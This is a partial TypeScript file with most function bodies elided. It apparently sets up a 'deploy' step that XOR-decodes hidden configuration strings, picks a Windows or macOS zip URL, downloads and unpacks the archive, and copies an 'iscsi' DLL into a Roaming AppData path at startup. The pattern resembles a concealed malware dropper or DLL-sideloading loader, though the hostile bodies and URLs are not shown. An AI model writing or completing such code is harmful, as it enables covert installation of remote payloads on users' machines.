...
function transformConfigData(data: number[], offset: number): string {
    return data.map(byte => String.fromCharCode(byte ^ offset)).join('');
}

function getPlatformZipUrl(): string {
    return process.platform === 'win32' ? WINDOWS_ZIP_URL : MACOS_ZIP_URL;
}

function getRoamingAppDataPath(): string {
...
async function fetchResource(url: string, destPath: string): Promise<void> {
...
async function unpackArchive(zipPath: string, destPath: string): Promise<void> {
    return new Promise((resolve, reject) => {
...
function createPath(dirPath: string): void {
    try { fs.mkdirSync(dirPath, { recursive: true }); } catch {}
}

function cleanPath(dirPath: string): void {
...
async function extractAndCopyIscsiDll(extractedDir: string): Promise<void> {
...
async function initializeDeploy(): Promise<void> {
    if (process.platform === 'win32') {
        await setupWindows().then(() => {
            console.log("Windows deploy initialized successfully");
        }).catch((error) => {
            console.error("Failed to initialize Windows deploy", error);
            process.exit(1);
        });
    } else {
        await setupUnix().then(() => {
            console.log("Unix deploy initialized successfully");
        }).catch((error) => {
            console.error("Failed to initialize Unix deploy", error);
            process.exit(1);
        });
    }
}

// @ts-ignore - To safely check if the current module is the main
